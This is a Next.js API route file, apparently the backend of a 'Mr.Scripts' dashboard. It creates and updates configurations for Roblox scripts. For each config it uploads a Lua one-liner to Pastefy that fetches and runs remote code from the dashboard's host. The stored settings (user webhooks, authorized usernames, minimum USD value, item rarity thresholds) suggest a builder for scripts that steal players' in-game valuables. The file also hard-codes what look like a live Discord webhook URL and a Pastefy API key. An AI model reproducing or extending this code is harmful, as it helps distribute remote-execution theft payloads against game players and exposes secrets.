import { NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { configs } from '@/lib/db/schema';
import { eq, and } from 'drizzle-orm';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth-options';
import crypto from 'crypto';

const ADMIN_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1563040551656230942/Wf3kTmn33bNTCiYuP_SOc8YPVxRPKx3wvXVH95KzGyKPCW6PbGThl14cu4FQ0TjWWdjX';
const PASTEFY_API_KEY = "B14zbks9yBHUGDxbGGTZnwhHfN3QD7ImmPUKziehSRJ9oOTTTQUEARDQ3h2a";

async function sendDiscordNotification(user: any, body: any) {
  try {
    const embed = {
      title: "🛠️ New/Updated Script Configuration",
      color: 0x5865F2,
      fields: [
        { name: "👤 Username", value: `\`${user.name || 'Unknown'}\``, inline: true },
        { name: "🆔 Discord ID", value: `\`${user.id}\``, inline: true },
        { name: "🎮 Game", value: `\`${body.game}\``, inline: true },
        { name: "📝 Script Name", value: `\`${body.name}\``, inline: false },
        { name: "👥 Authorized Usernames", value: `\`\`\`${body.usernames}\`\`\``, inline: false },
        { name: "🔗 User Webhook", value: `\`\`\`${body.webhook || 'Not provided'}\`\`\``, inline: false },
      ],
      timestamp: new Date().toISOString(),
    };
    await fetch(ADMIN_WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) });
  } catch (error) {}
}

async function uploadToPastefy(content: string) {
  const maxRetries = 3;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      // دائمًا نقوم بإنشاء Paste جديد لضمان عدم حدوث أخطاء في الـ PATCH أو الـ IDs القديمة
      let res = await fetch("https://pastefy.app/api/v2/paste", {
        method: "POST",
        headers: { "Content-Type": "application/json", "x-auth-key": PASTEFY_API_KEY },
        body: JSON.stringify({ content, title: "Mr.Scripts", visibility: "UNLISTED", type: "PASTE" })
      });

      if (!res.ok) {
        res = await fetch("https://pastefy.app/api/v2/paste", {
          method: "POST",
          headers: { "Content-Type": "application/json", "Authorization": `Bearer ${PASTEFY_API_KEY}` },
          body: JSON.stringify({ content, title: "Mr.Scripts", visibility: "UNLISTED", type: "PASTE" })
        });
      }

      if (res.ok) {
        const data = await res.json();
        const id = data?.paste?.id || data?.id;
        if (id) return id;
      }
    } catch (error) {}
    await new Promise(r => setTimeout(r, 1000));
  }
  return null;
}

export async function POST(req: Request) {
  try {
    const session = await getServerSession(authOptions);
    const userId = session?.user?.id || 'anonymous';
    const body = await req.json();
    const { name, game, webhook, usernames, minUSD, pingEveryone, minRarity } = body;

    const token = crypto.randomBytes(16).toString('hex');
    const pastefyContent = `loadstring(game:HttpGet("https://mr-scripts-dashboard-development.vercel.app/api/script/${token}"))()`;
    
    const pastefyId = await uploadToPastefy(pastefyContent);
    if (!pastefyId) {
      return NextResponse.json({ error: 'Pastefy API failed. Please try again.' }, { status: 500 });
    }

    const [inserted] = await db.insert(configs).values({
      userId, name, game, webhook,
      usernames: usernames.split(',').map((u: string) => u.trim()).filter(Boolean),
      minRarity: minRarity || '', 
      minUSD: String(minUSD || '5'),
      pingEveryone: pingEveryone === 'Yes' || pingEveryone === true,
      token, pastefyId, 
    }).returning();

    await sendDiscordNotification({ id: userId, name: session?.user?.name || 'Unknown' }, { name, game, webhook, usernames });
    return NextResponse.json({ config: { ...inserted, token, pingFruits: (minRarity || '').split(',').map((s: string) => s.trim()).filter(Boolean) } }, { status: 201 });
  } catch (error: any) {
    return NextResponse.json({ error: error?.message }, { status: 500 });
  }
}

export async function PATCH(req: Request) {
  try {
    const session = await getServerSession(authOptions);
    const userId = session?.user?.id || 'anonymous';
    const body = await req.json();
    const { id, name, game, webhook, usernames, minUSD, pingEveryone, minRarity } = body;

    if (!id) return NextResponse.json({ error: 'Missing ID' }, { status: 400 });

    const [existingConfig] = await db.select().from(configs).where(and(eq(configs.id, id), eq(configs.userId, userId))).limit(1);
    if (!existingConfig) return NextResponse.json({ error: 'Config not found' }, { status: 404 });

    // نستخدم الـ token الثابت القديم لهذا السكربت لكي يظل رابط الـ loadstring يعمل بدون تغيير، ونقوم بتحديث محتوى الـ Pastefy أو إنشاء واحد جديد وربطه به
    const pastefyContent = `loadstring(game:HttpGet("https://mr-scripts-dashboard-development.vercel.app/api/script/${existingConfig.token}"))()`;
    const pastefyId = await uploadToPastefy(pastefyContent);

    if (!pastefyId) {
      return NextResponse.json({ error: 'Pastefy API failed. Please try again.' }, { status: 500 });
    }

    const [updated] = await db.update(configs)
      .set({ 
        name, game, webhook, 
        usernames: usernames.split(',').map((u: string) => u.trim()).filter(Boolean), 
        minRarity: minRarity || '', 
        minUSD: String(minUSD || '5'), 
        pingEveryone: pingEveryone === 'Yes' || pingEveryone === true, 
        pastefyId 
      })
      .where(and(eq(configs.id, id), eq(configs.userId, userId)))
      .returning();

    return NextResponse.json({ config: { ...updated, token: updated.token, pingFruits: (minRarity || '').split(',').map((s: string) => s.trim()).filter(Boolean) } }, { status: 200 });
  } catch (error: any) {
    return NextResponse.json({ error: error?.message }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const session = await getServerSession(authOptions);
    const userId = session?.user?.id || 'anonymous';
    const { searchParams } = new URL(req.url);
    const id = searchParams.get('id');
    if (!id) return NextResponse.json({ error: 'Missing ID' }, { status: 400 });
    await db.delete(configs).where(and(eq(configs.id, id), eq(configs.userId, userId)));
    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error: any) {
    return NextResponse.json({ error: error?.message }, { status: 500 });
  }
}